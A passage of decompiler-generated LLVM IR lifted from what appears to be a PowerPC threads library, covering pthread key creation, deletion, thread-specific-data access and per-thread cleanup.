  %v1_10007a94 = add i32 %v2_10007a8c, 236
  %v2_10007a94 = inttoptr i32 %v1_10007a94 to i32*
  %v3_10007a94 = load i32, i32* %v2_10007a94, align 4
  %v0_10007a98 = load i32, i32* @r27, align 4
  %v3_10007a98 = add i32 %v3_10007a94, %v1_10007a88
  %v4_10007a98 = inttoptr i32 %v3_10007a98 to i32*
  store i32 %v0_10007a98, i32* %v4_10007a98, align 4
  %v0_10007aa0.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007a9c

dec_label_pc_10007a9c:                            ; preds = %dec_label_pc_10007a70, %dec_label_pc_10007a38, %entry, %dec_label_pc_10007a84
  %v0_10007aa0 = phi i32 [ 12, %dec_label_pc_10007a70 ], [ 22, %dec_label_pc_10007a38 ], [ 22, %entry ], [ %v0_10007aa0.pre, %dec_label_pc_10007a84 ]
  ret i32 %v0_10007aa0

; uselistorder directives
  uselistorder i32 %v1_10007a38, { 2, 0, 1 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007a9c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007a84, { 1, 0 }
}

define i32 @pthread_key_create(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10007ae8.lr.ph:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1002e954.251 to i32), i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  store i32 ptrtoint (i32* @global_var_10007ad8.252 to i32), i32* @lr, align 4
  %v1_10007ad4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002e954.251 to i32))
  store i32 %v1_10007ad4, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r31, align 4
  store i32 0, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_1002c954.249 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1002c954.249 to i32), i32* @r10, align 4
  br label %dec_label_pc_10007ae8

dec_label_pc_10007ae8:                            ; preds = %dec_label_pc_10007ae8.lr.ph, %dec_label_pc_10007b18
  %v0_10007b2c = phi i32 [ 1024, %dec_label_pc_10007ae8.lr.ph ], [ %v1_10007b2c, %dec_label_pc_10007b18 ]
  %v0_10007b18 = phi i32 [ 0, %dec_label_pc_10007ae8.lr.ph ], [ %v1_10007b18, %dec_label_pc_10007b18 ]
  %v1_10007afc = phi i32 [ 0, %dec_label_pc_10007ae8.lr.ph ], [ %v1_10007b20, %dec_label_pc_10007b18 ]
  %v2_10007ae8 = add i32 %v1_10007afc, ptrtoint (i32* @global_var_1002c954.249 to i32)
  %v3_10007ae8 = inttoptr i32 %v2_10007ae8 to i32*
  %v4_10007ae8 = load i32, i32* %v3_10007ae8, align 4
  %v3_10007aec = icmp eq i32 %v4_10007ae8, 0
  br i1 %v3_10007aec, label %dec_label_pc_10007af4, label %dec_label_pc_10007b18

dec_label_pc_10007af4:                            ; preds = %dec_label_pc_10007ae8
  store i32 1, i32* %v3_10007ae8, align 4
  store i32 ptrtoint (i32* @global_var_1002e954.251 to i32), i32* @r3, align 4
  %v0_10007b04 = load i32, i32* @r30, align 4
  %v1_10007b04 = load i32, i32* @r10, align 4
  %v2_10007b04 = add i32 %v1_10007b04, 4
  %v3_10007b04 = inttoptr i32 %v2_10007b04 to i32*
  store i32 %v0_10007b04, i32* %v3_10007b04, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007b0c.254 to i32), i32* @lr, align 4
  %v0_10007b08 = call i32 @pthread_mutex_unlock()
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10007b10 = load i32, i32* @r31, align 4
  %v1_10007b10 = load i32, i32* @r29, align 4
  %v2_10007b10 = inttoptr i32 %v1_10007b10 to i32*
  store i32 %v0_10007b10, i32* %v2_10007b10, align 4
  %v0_10007b50.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b40

dec_label_pc_10007b18:                            ; preds = %dec_label_pc_10007ae8
  %v1_10007b18 = add nuw nsw i32 %v0_10007b18, 1
  store i32 %v1_10007b18, i32* @r31, align 4
  %v1_10007b20 = mul i32 %v1_10007b18, 8
  store i32 %v1_10007b20, i32* @r11, align 4
  store i32 ptrtoint (i32* @global_var_1002c954.249 to i32), i32* @r9, align 4
  %v2_10007b28 = add i32 %v1_10007b20, ptrtoint (i32* @global_var_1002c954.249 to i32)
  store i32 %v2_10007b28, i32* @r10, align 4
  %v1_10007b2c = add nsw i32 %v0_10007b2c, -1
  %v2_10007b2c = icmp eq i32 %v1_10007b2c, 0
  br i1 %v2_10007b2c, label %dec_label_pc_10007b30, label %dec_label_pc_10007ae8

dec_label_pc_10007b30:                            ; preds = %dec_label_pc_10007b18
  store i32 ptrtoint (i32* @global_var_1002e954.251 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007b3c.255 to i32), i32* @lr, align 4
  %v0_10007b38 = call i32 @pthread_mutex_unlock()
  store i32 11, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10007b40

dec_label_pc_10007b40:                            ; preds = %dec_label_pc_10007af4, %dec_label_pc_10007b30
  %v0_10007b50 = phi i32 [ %v0_10007b50.pre, %dec_label_pc_10007af4 ], [ 11, %dec_label_pc_10007b30 ]
  ret i32 %v0_10007b50

; uselistorder directives
  uselistorder i32 %v1_10007b2c, { 1, 0 }
  uselistorder i32 %v1_10007b20, { 1, 0, 2 }
  uselistorder i32 %v1_10007b18, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_10007b40, { 1, 0 }
  uselistorder label %dec_label_pc_10007ae8, { 1, 0 }
}

define i32 @pthread_key_delete(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %v0_10007b58 = load i32, i32* @lr, align 4
  store i32 %v0_10007b58, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  store i32 ptrtoint (i32* @global_var_1002e954.251 to i32), i32* @r30, align 4
  %v0_10007b74 = load i32, i32* @r2, align 4
  store i32 %v0_10007b74, i32* @r29, align 4
  store i32 268467068, i32* @lr, align 4
  %v1_10007b78 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1002e954.251 to i32))
  %v2_10007b7c = icmp ugt i32 %arg1, 1023
  br i1 %v2_10007b7c, label %dec_label_pc_10007ba0, label %dec_label_pc_10007b84

dec_label_pc_10007b84:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r9, align 4
  %v1_10007b88 = mul i32 %arg1, 8
  store i32 %v1_10007b88, i32* @r11, align 4
  %v2_10007b90 = add i32 %v1_10007b88, ptrtoint (i32* @global_var_1002c954.249 to i32)
  %v3_10007b90 = inttoptr i32 %v2_10007b90 to i32*
  %v4_10007b90 = load i32, i32* %v3_10007b90, align 4
  store i32 %v4_10007b90, i32* %r0.global-to-local, align 4
  store i32 %v2_10007b90, i32* @r8, align 4
  %v3_10007b98 = icmp eq i32 %v4_10007b90, 0
  br i1 %v3_10007b98, label %dec_label_pc_10007ba0, label %dec_label_pc_10007bb0

dec_label_pc_10007ba0:                            ; preds = %dec_label_pc_10007b84, %entry
  %v0_10007ba0 = load i32, i32* @r30, align 4
  store i32 %v0_10007ba0, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007ba8.256 to i32), i32* @lr, align 4
  %v0_10007ba4 = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10007c14

dec_label_pc_10007bb0:                            ; preds = %dec_label_pc_10007b84
  %v3_10007bb4 = load i32, i32* @global_var_1002c258.128, align 4
  store i32 %v3_10007bb4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r9, align 4
  store i32 0, i32* %v3_10007b90, align 4
  %v0_10007bc0 = load i32, i32* %r0.global-to-local, align 4
  %v3_10007bc0 = icmp eq i32 %v0_10007bc0, -1
  %v0_10007bc4 = load i32, i32* @r9, align 4
  %v1_10007bc4 = load i32, i32* @r8, align 4
  %v2_10007bc4 = add i32 %v1_10007bc4, 4
  %v3_10007bc4 = inttoptr i32 %v2_10007bc4 to i32*
  store i32 %v0_10007bc4, i32* %v3_10007bc4, align 4
  br i1 %v3_10007bc0, label %dec_label_pc_10007c04, label %dec_label_pc_10007bcc

dec_label_pc_10007bcc:                            ; preds = %dec_label_pc_10007bb0
  %v1_10007bcc = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v0_10007bd0 = load i32, i32* @r29, align 4
  store i32 %v0_10007bd0, i32* @r9, align 4
  %v1_10007bd4 = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  %v0_10007bd8.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10007bd8

dec_label_pc_10007bd8:                            ; preds = %dec_label_pc_10007bf8, %dec_label_pc_10007bcc
  %v0_10007bd8 = phi i32 [ %v2_10007bf8, %dec_label_pc_10007bf8 ], [ %v0_10007bd8.pre, %dec_label_pc_10007bcc ]
  %v1_10007bd8 = add i32 %v0_10007bd8, 44
  %v2_10007bd8 = inttoptr i32 %v1_10007bd8 to i8*
  %v3_10007bd8 = load i8, i8* %v2_10007bd8, align 1
  %v4_10007bd8 = zext i8 %v3_10007bd8 to i32
  store i32 %v4_10007bd8, i32* %r0.global-to-local, align 4
  %v2_10007bdc = add i32 %v0_10007bd8, %v1_10007bd4
  store i32 %v2_10007bdc, i32* @r11, align 4
  %v3_10007be0 = icmp eq i8 %v3_10007bd8, 0
  br i1 %v3_10007be0, label %dec_label_pc_10007be8, label %dec_label_pc_10007bf8

dec_label_pc_10007be8:                            ; preds = %dec_label_pc_10007bd8
  %v1_10007be8 = add i32 %v2_10007bdc, 236
  %v2_10007be8 = inttoptr i32 %v1_10007be8 to i32*
  %v3_10007be8 = load i32, i32* %v2_10007be8, align 4
  store i32 %v3_10007be8, i32* @r11, align 4
  %v3_10007bec = icmp eq i32 %v3_10007be8, 0
  br i1 %v3_10007bec, label %dec_label_pc_10007bf8, label %dec_label_pc_10007bf4

dec_label_pc_10007bf4:                            ; preds = %dec_label_pc_10007be8
  %v3_10007bf4 = add i32 %v3_10007be8, %v1_10007bcc
  %v4_10007bf4 = inttoptr i32 %v3_10007bf4 to i32*
  store i32 %v4_10007bd8, i32* %v4_10007bf4, align 4
  %v0_10007bf8.pre = load i32, i32* @r9, align 4
  br label %dec_label_pc_10007bf8

dec_label_pc_10007bf8:                            ; preds = %dec_label_pc_10007bd8, %dec_label_pc_10007be8, %dec_label_pc_10007bf4
  %v0_10007bf8 = phi i32 [ %v0_10007bd8, %dec_label_pc_10007bd8 ], [ %v0_10007bd8, %dec_label_pc_10007be8 ], [ %v0_10007bf8.pre, %dec_label_pc_10007bf4 ]
  %v1_10007bf8 = inttoptr i32 %v0_10007bf8 to i32*
  %v2_10007bf8 = load i32, i32* %v1_10007bf8, align 4
  store i32 %v2_10007bf8, i32* @r9, align 4
  %v1_10007bfc = load i32, i32* @r29, align 4
  %v4_10007bfc = icmp eq i32 %v2_10007bf8, %v1_10007bfc
  br i1 %v4_10007bfc, label %dec_label_pc_10007c04, label %dec_label_pc_10007bd8

dec_label_pc_10007c04:                            ; preds = %dec_label_pc_10007bf8, %dec_label_pc_10007bb0
  store i32 ptrtoint (i32* @global_var_1002e954.251 to i32), i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10007c10.257 to i32), i32* @lr, align 4
  %v0_10007c0c = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_10007c14

dec_label_pc_10007c14:                            ; preds = %dec_label_pc_10007ba0, %dec_label_pc_10007c04
  %storemerge = phi i32 [ 22, %dec_label_pc_10007ba0 ], [ 0, %dec_label_pc_10007c04 ]
  store i32 %v0_10007b58, i32* %r0.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10007bf8, { 1, 2, 0 }
  uselistorder i32 %v0_10007bd8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_10007b88, { 1, 0 }
  uselistorder i32* @global_var_1002c258.128, { 4, 5, 6, 7, 8, 0, 9, 1, 10, 2, 11, 12, 13, 14, 15, 16, 17, 18, 19, 3, 20 }
  uselistorder i32 ptrtoint (i32* @global_var_1002e954.251 to i32), { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10007c14, { 1, 0 }
  uselistorder label %dec_label_pc_10007bf8, { 2, 1, 0 }
}

define i32 @__pthread_internal_tsd_address(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10007c28 = mul i32 %arg1, 4
  %v1_10007c2c = load i32, i32* @r2, align 4
  %v2_10007c2c = add i32 %v1_10007c28, 364
  %v1_10007c30 = add i32 %v2_10007c2c, %v1_10007c2c
  ret i32 %v1_10007c30
}

define i32 @__pthread_internal_tsd_get(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_10007c38 = mul i32 %arg1, 4
  %v1_10007c3c = load i32, i32* @r2, align 4
  %v2_10007c3c = add i32 %v1_10007c3c, %v1_10007c38
  %v1_10007c40 = add i32 %v2_10007c3c, 364
  %v2_10007c40 = inttoptr i32 %v1_10007c40 to i32*
  %v3_10007c40 = load i32, i32* %v2_10007c40, align 4
  ret i32 %v3_10007c40
}

define i32 @__pthread_internal_tsd_set(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v1_10007c48 = mul i32 %arg1, 4
  %v1_10007c4c = load i32, i32* @r2, align 4
  %v2_10007c4c = add i32 %v1_10007c48, 364
  %v2_10007c50 = add i32 %v2_10007c4c, %v1_10007c4c
  %v3_10007c50 = inttoptr i32 %v2_10007c50 to i32*
  store i32 %arg2, i32* %v3_10007c50, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 364, { 0, 2, 1 }
}

define i32 @__pthread_destroy_specifics(i32 %arg1) local_unnamed_addr {
entry:
  %r28.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 1, i32* @r8, align 4
  %v0_10007c6c = load i32, i32* @r2, align 4
  store i32 %v0_10007c6c, i32* @r29, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10007d10

dec_label_pc_10007c7c:                            ; preds = %dec_label_pc_10007d18, %dec_label_pc_10007cf8
  %v0_10007d08.pr16 = phi i32 [ 0, %dec_label_pc_10007d18 ], [ %v0_10007d08.pr, %dec_label_pc_10007cf8 ]
  %v1_10007c84 = phi i32 [ %v1_10007c843, %dec_label_pc_10007d18 ], [ %v1_10007c844, %dec_label_pc_10007cf8 ]
  %v0_10007c7c = phi i32 [ 0, %dec_label_pc_10007d18 ], [ %v1_10007cf8, %dec_label_pc_10007cf8 ]
  %v1_10007c7c = mul i32 %v0_10007c7c, 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v2_10007c84 = add i32 %v1_10007c7c, %v1_10007c84
  %v1_10007c88 = add i32 %v2_10007c84, 236
  %v2_10007c88 = inttoptr i32 %v1_10007c88 to i32*
  %v3_10007c88 = load i32, i32* %v2_10007c88, align 4
  %v3_10007c8c = icmp eq i32 %v3_10007c88, 0
  br i1 %v3_10007c8c, label %dec_label_pc_10007cf8, label %dec_label_pc_10007cc8.outer

dec_label_pc_10007c98:                            ; preds = %dec_label_pc_10007cc8
  %v2_10007cd0 = add i32 %v1_10007cc8, %v0_10007ce8
  %v1_10007cd8 = mul i32 %v2_10007cd0, 8
  %v1_10007c98 = add i32 %v1_10007cd8, add (i32 ptrtoint (i32* @global_var_1002c954.249 to i32), i32 4)
  %v2_10007c98 = inttoptr i32 %v1_10007c98 to i32*
  %v3_10007c98 = load i32, i32* %v2_10007c98, align 4
  %v3_10007ca0 = icmp eq i32 %v3_10007c98, 0
  br i1 %v3_10007ca0, label %dec_label_pc_10007cc8, label %dec_label_pc_10007cb4

dec_label_pc_10007cb4:                            ; preds = %dec_label_pc_10007c98
  %v3_10007c9c = load i32, i32* %v2_10007c9c, align 4
  %v2_10007ca4 = add i32 %v3_10007c9c, %v1_10007ce8
  %v3_10007ca4 = inttoptr i32 %v2_10007ca4 to i32*
  store i32 0, i32* %v3_10007ca4, align 4
  call void @__pseudo_call(i32 %v3_10007c98)
  store i32 1, i32* @r8, align 4
  %v0_10007cc8.pre.pre = load i32, i32* %r31.global-to-local, align 4
  %v0_10007ccc.pre.pre = load i32, i32* %r30.global-to-local, align 4
  %v1_10007cec.pre.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10007cc8.outer

dec_label_pc_10007cc8.outer:                      ; preds = %dec_label_pc_10007c7c, %dec_label_pc_10007cb4
  %v0_10007d08.pr14.ph = phi i32 [ 1, %dec_label_pc_10007cb4 ], [ %v0_10007d08.pr16, %dec_label_pc_10007c7c ]
  %v1_10007cec.ph = phi i32 [ %v1_10007cec.pre.pre, %dec_label_pc_10007cb4 ], [ %v1_10007c84, %dec_label_pc_10007c7c ]
  %v0_10007ce8.ph = phi i32 [ %v0_10007ccc.pre.pre, %dec_label_pc_10007cb4 ], [ 0, %dec_label_pc_10007c7c ]
  %v0_10007ce4.ph = phi i32 [ %v0_10007cc8.pre.pre, %dec_label_pc_10007cb4 ], [ %v0_10007c7c, %dec_label_pc_10007c7c ]
  %v1_10007cc8 = mul i32 %v0_10007ce4.ph, 32
  %v1_10007ce4 = mul i32 %v0_10007ce4.ph, 4
  %v2_10007cec = add i32 %v1_10007ce4, %v1_10007cec.ph
  %v1_10007c9c = add i32 %v2_10007cec, 236
  %v2_10007c9c = inttoptr i32 %v1_10007c9c to i32*
  br label %dec_label_pc_10007cc8

dec_label_pc_10007cc8:                            ; preds = %dec_label_pc_10007cc8.outer, %dec_label_pc_10007c98
  %v0_10007ce8 = phi i32 [ %v1_10007cf0, %dec_label_pc_10007c98 ], [ %v0_10007ce8.ph, %dec_label_pc_10007cc8.outer ]
  %v1_10007ce8 = mul i32 %v0_10007ce8, 4
  store i32 %v1_10007ce8, i32* @r10, align 4
  %v1_10007cf0 = add i32 %v0_10007ce8, 1
  store i32 %v1_10007cf0, i32* %r30.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_10007ce8, 32
  br i1 %tmp20, label %dec_label_pc_10007c98, label %dec_label_pc_10007cf8.loopexit

dec_label_pc_10007cf8.loopexit:                   ; preds = %dec_label_pc_10007cc8
  br label %dec_label_pc_10007cf8

dec_label_pc_10007cf8:                            ; preds = %dec_label_pc_10007cf8.loopexit, %dec_label_pc_10007c7c
  %v0_10007d08.pr = phi i32 [ %v0_10007d08.pr16, %dec_label_pc_10007c7c ], [ %v0_10007d08.pr14.ph, %dec_label_pc_10007cf8.loopexit ]
  %v0_10007cf8 = phi i32 [ %v0_10007c7c, %dec_label_pc_10007c7c ], [ %v0_10007ce4.ph, %dec_label_pc_10007cf8.loopexit ]
  %v1_10007c844 = phi i32 [ %v1_10007c84, %dec_label_pc_10007c7c ], [ %v1_10007cec.ph, %dec_label_pc_10007cf8.loopexit ]
  %v1_10007cf8 = add i32 %v0_10007cf8, 1
  store i32 %v1_10007cf8, i32* %r31.global-to-local, align 4
  %tmp21 = icmp slt i32 %v1_10007cf8, 32
  br i1 %tmp21, label %dec_label_pc_10007c7c, label %dec_label_pc_10007d04

dec_label_pc_10007d04:                            ; preds = %dec_label_pc_10007cf8
  %v0_10007d04 = load i32, i32* %r28.global-to-local, align 4
  %v1_10007d04 = add i32 %v0_10007d04, 1
  store i32 %v1_10007d04, i32* %r28.global-to-local, align 4
  %v3_10007d08 = icmp eq i32 %v0_10007d08.pr, 0
  br i1 %v3_10007d08, label %dec_label_pc_10007d24, label %dec_label_pc_10007d10

dec_label_pc_10007d10:                            ; preds = %entry, %dec_label_pc_10007d04
  %v1_10007c843 = phi i32 [ %v0_10007c6c, %entry ], [ %v1_10007c844, %dec_label_pc_10007d04 ]
  %v0_10007d10 = phi i32 [ 0, %entry ], [ %v1_10007d04, %dec_label_pc_10007d04 ]
  %v2_10007d10 = icmp sgt i32 %v0_10007d10, 3
  br i1 %v2_10007d10, label %dec_label_pc_10007d24, label %dec_label_pc_10007d18

dec_label_pc_10007d18:                            ; preds = %dec_label_pc_10007d10
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10007c7c

dec_label_pc_10007d24:                            ; preds = %dec_label_pc_10007d10, %dec_label_pc_10007d04
  %v0_10007d24 = phi i32 [ %v1_10007c843, %dec_label_pc_10007d10 ], [ %v1_10007c844, %dec_label_pc_10007d04 ]
  %v1_10007d24 = add i32 %v0_10007d24, 28
  %v2_10007d24 = inttoptr i32 %v1_10007d24 to i32*
  %v3_10007d24 = load i32, i32* %v2_10007d24, align 4
  store i32 %v3_10007d24, i32* @r3, align 4
  store i32 %v0_10007d24, i32* @r4, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10007d34.259 to i32), i32* @lr, align 4
  %v0_10007d30 = call i32 @__pthread_lock()
  br label %dec_label_pc_10007d54

dec_label_pc_10007d38:                            ; preds = %dec_label_pc_10007d54
  %v1_10007d38 = add i32 %v2_10007d5c, 236
  %v2_10007d38 = inttoptr i32 %v1_10007d38 to i32*
  %v3_10007d38 = load i32, i32* %v2_10007d38, align 4
  %v3_10007d3c = icmp eq i32 %v3_10007d38, 0
  store i32 %v3_10007d38, i32* @r3, align 4
  br i1 %v3_10007d3c, label %dec_label_pc_10007d54, label %dec_label_pc_10007d48

dec_label_pc_10007d48:                            ; preds = %dec_label_pc_10007d38
  store i32 ptrtoint (i32* @global_var_10007d4c.260 to i32), i32* @lr, align 4
  %v0_10007d48 = call i32 @free()
  %v1_10007d50 = load i32, i32* @r30, align 4
  %v2_10007d50 = add i32 %v1_10007d50, 12
  %v3_10007d50 = inttoptr i32 %v2_10007d50 to i32*
  store i32 0, i32* %v3_10007d50, align 4
  br label %dec_label_pc_10007d54

dec_label_pc_10007d54:                            ; preds = %dec_label_pc_10007d38, %dec_label_pc_10007d48, %dec_label_pc_10007d24
  %v0_10007d54 = load i32, i32* @r31, align 4
  %v1_10007d58 = mul i32 %v0_10007d54, 4
  %v1_10007d5c = load i32, i32* @r29, align 4
  %v2_10007d5c = add i32 %v1_10007d5c, %v1_10007d58
  %v1_10007d60 = add i32 %v0_10007d54, 1
  store i32 %v1_10007d60, i32* @r31, align 4
  %v1_10007d64 = add i32 %v2_10007d5c, 224
  store i32 %v1_10007d64, i32* @r30, align 4
  %tmp22 = icmp slt i32 %v0_10007d54, 32
  br i1 %tmp22, label %dec_label_pc_10007d38, label %dec_label_pc_10007d6c

dec_label_pc_10007d6c:                            ; preds = %dec_label_pc_10007d54
  %v1_10007d6c = add i32 %v1_10007d5c, 28
  %v2_10007d6c = inttoptr i32 %v1_10007d6c to i32*
  %v3_10007d6c = load i32, i32* %v2_10007d6c, align 4
  store i32 %v3_10007d6c, i32* @r3, align 4
  store i32 268467572, i32* @lr, align 4
  %v0_10007d70 = call i32 @__pthread_unlock()
  ret i32 %v0_10007d70

; uselistorder directives
  uselistorder i32 %v2_10007d5c, { 1, 0 }
  uselistorder i32 %v0_10007d54, { 1, 2, 0 }
  uselistorder i32 %v0_10007d24, { 1, 0 }
  uselistorder i32 %v1_10007cf8, { 1, 2, 0 }
  uselistorder i32 %v1_10007cf0, { 1, 0 }
  uselistorder i32 %v0_10007ce8, { 2, 3, 0, 1 }
  uselistorder i32 %v0_10007ce4.ph, { 1, 0, 2 }
  uselistorder i32 %v0_10007c7c, { 2, 1, 0 }
  uselistorder i32 %v1_10007c84, { 2, 0, 1 }
  uselistorder i32 %v0_10007d08.pr16, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @__pthread_unlock, { 8, 10, 9, 43, 42, 41, 40, 39, 38, 37, 46, 36, 34, 33, 35, 0, 32, 47, 31, 45, 30, 29, 28, 27, 26, 7, 6, 4, 3, 2, 1, 5, 25, 44, 12, 24, 23, 13, 11, 22, 21, 20, 19, 18, 17, 16, 15, 14 }
  uselistorder i32 ()* @__pthread_lock, { 6, 10, 29, 28, 27, 32, 25, 24, 26, 23, 22, 1, 0, 21, 33, 20, 31, 19, 18, 5, 3, 2, 4, 17, 30, 8, 16, 15, 9, 7, 14, 13, 12, 11 }
  uselistorder label %dec_label_pc_10007d54, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10007d10, { 1, 0 }
  uselistorder label %dec_label_pc_10007cc8.outer, { 1, 0 }
}

define i32 @pthread_getspecific(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %v2_10007d88 = icmp ugt i32 %arg1, 1023
  %v1_10007d8c = call i32 @__asm_rlwinm(i32 %arg1, i32 29, i32 3, i32 29)
  store i32 %v1_10007d8c, i32* %r0.global-to-local, align 4
  %v1_10007d90 = load i32, i32* @r2, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  br i1 %v2_10007d88, label %dec_label_pc_10007dc8, label %dec_label_pc_10007d9c

dec_label_pc_10007d9c:                            ; preds = %entry
  %v2_10007d90 = add i32 %v1_10007d90, %v1_10007d8c
  %v1_10007d9c = add i32 %v2_10007d90, 236
  %v2_10007d9c = inttoptr i32 %v1_10007d9c to i32*
  %v3_10007d9c = load i32, i32* %v2_10007d9c, align 4
  store i32 %v3_10007d9c, i32* %r11.global-to-local, align 4
  %v1_10007da0 = mul i32 %arg1, 8
  store i32 %v1_10007da0, i32* %r0.global-to-local, align 4
  %v3_10007da4 = icmp eq i32 %v3_10007d9c, 0
  br i1 %v3_10007da4, label %dec_label_pc_10007dc8, label %dec_label_pc_10007dac

dec_label_pc_10007dac:                            ; preds = %dec_label_pc_10007d9c
  %v1_10007db0 = call i32 @__asm_rlwinm(i32 %arg1, i32 2, i32 25, i32 29)
  %v1_10007db8 = load i32, i32* %r0.global-to-local, align 4
  %v2_10007db8 = add i32 %v1_10007db8, ptrtoint (i32* @global_var_1002c954.249 to i32)
  %v3_10007db8 = inttoptr i32 %v2_10007db8 to i32*
  %v4_10007db8 = load i32, i32* %v3_10007db8, align 4
  store i32 %v4_10007db8, i32* %r0.global-to-local, align 4
  %v3_10007dbc = icmp eq i32 %v4_10007db8, 0
  br i1 %v3_10007dbc, label %dec_label_pc_10007dac.dec_label_pc_10007dc8_crit_edge, label %dec_label_pc_10007dc4

dec_label_pc_10007dac.dec_label_pc_10007dc8_crit_edge: ; preds = %dec_label_pc_10007dac
  %v0_10007dc8.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007dc8

dec_label_pc_10007dc4:                            ; preds = %dec_label_pc_10007dac
  %v1_10007dc4 = load i32, i32* %r11.global-to-local, align 4
  %v2_10007dc4 = add i32 %v1_10007dc4, %v1_10007db0
  %v3_10007dc4 = inttoptr i32 %v2_10007dc4 to i32*
  %v4_10007dc4 = load i32, i32* %v3_10007dc4, align 4
  store i32 %v4_10007dc4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10007dc8

dec_label_pc_10007dc8:                            ; preds = %dec_label_pc_10007dac.dec_label_pc_10007dc8_crit_edge, %dec_label_pc_10007d9c, %entry, %dec_label_pc_10007dc4
  %v0_10007dc8 = phi i32 [ %v0_10007dc8.pre, %dec_label_pc_10007dac.dec_label_pc_10007dc8_crit_edge ], [ 0, %dec_label_pc_10007d9c ], [ 0, %entry ], [ %v4_10007dc4, %dec_label_pc_10007dc4 ]
  ret i32 %v0_10007dc8

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1002c954.249 to i32), { 4, 1, 5, 6, 8, 0, 2, 3, 7 }
  uselistorder i32 236, { 2, 1, 5, 6, 3, 4, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10007dc8, { 3, 0, 1, 2 }
}

define i32 @wait_node_dequeue(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v4_10007dd0 = icmp eq i32 %tmp, %arg1
  %v1_10007dd8 = inttoptr i32 %arg3 to i32*
  br i1 %v4_10007dd0, label %dec_label_pc_10007ddc, label %dec_label_pc_10007e14

dec_label_pc_10007ddc:                            ; preds = %entry
  %r9.promoted = load i32, i32* @r9, align 4
  %v5_10007de0 = icmp eq i32 %r9.promoted, %arg3
  %v0_10007df8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v5_10007de0, i32 %v0_10007df8)
  %v0_10007e081 = load i32, i32* %r4.global-to-local, align 4
  %v1_10007e082 = inttoptr i32 %v0_10007e081 to i32*
  %v2_10007e083 = load i32, i32* %v1_10007e082, align 4
  %v4_10007e0c6 = icmp eq i32 %v2_10007e083, %arg3
  br i1 %v4_10007e0c6, label %dec_label_pc_10007e14, label %dec_label_pc_10007e00

dec_label_pc_10007e00:                            ; preds = %dec_label_pc_10007ddc, %dec_label_pc_10007e00
  %v0_10007e00 = phi i32 [ %v2_10007e08, %dec_label_pc_10007e00 ], [ %v2_10007e083, %dec_label_pc_10007ddc ]
  store i32 %v0_10007e00, i32* %r4.global-to-local, align 4
